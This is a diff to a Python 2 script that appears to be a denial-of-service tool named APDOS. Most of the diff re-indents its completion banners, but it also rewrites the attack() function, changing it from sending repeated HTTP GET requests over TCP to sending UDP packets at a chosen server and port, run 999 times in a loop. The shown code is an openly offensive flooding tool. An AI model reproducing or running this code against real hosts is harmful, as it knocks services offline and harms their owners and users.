@@ -231,36 +231,35 @@ time.sleep(2)
 done4 = True
 if (version == 'GREAT'):
 	import UDPdos
-	print "-=-+- -+-=-  -=-+- -+-=-"
-	print "   - APDOS COMPLETE -   "
-	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   -=-+- -+-=-  -=-+- -+-=-"
+	print "      - APDOS COMPLETE -   "
+	print "   -=-+- -+-=-  -=-+- -+-=-"
 	quit()
 if (version == 'great'):
 	import UDPdos
-	print "-=-+- -+-=-  -=-+- -+-=-"
-	print "   - APDOS COMPLETE -   "
-	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   -=-+- -+-=-  -=-+- -+-=-"
+	print "      - APDOS COMPLETE -   "
+	print "   -=-+- -+-=-  -=-+- -+-=-"
 	quit()
 if (version == 'feedbacks'):
 	import apdosFEED
-	print "-=-+- -+-=-  -=-+- -+-=-"
-	print "   - APDOS COMPLETE -   "
-	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   -=-+- -+-=-  -=-+- -+-=-"
+	print "      - APDOS COMPLETE -   "
+	print "   -=-+- -+-=-  -=-+- -+-=-"
 	quit()
 if (version == 'FEEDBACKS'):
 	import apdosFEED
-	print "-=-+- -+-=-  -=-+- -+-=-"
-	print "   - APDOS COMPLETE -   "
-	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   -=-+- -+-=-  -=-+- -+-=-"
+	print "      - APDOS COMPLETE -   "
+	print "   -=-+- -+-=-  -=-+- -+-=-"
 	quit()
 # -+--=- -=--+- #
 def attack():  
 	#pid = os.fork()  
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-	s.connect((server, 80))  
-	print ">> GET /" + type + " HTTP/1.1"  
-	s.send("GET /" + type + " HTTP/1.1\r\n")  
-	s.send("Host: " + server  + "\r\n\r\n");  
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
+	s.sendto(type, (server, int(port)))
+	print "Data: " + type
+	print "Server: " + server + ":" + port
 	s.close()
 for i in range(1, 1000):
 	attack()
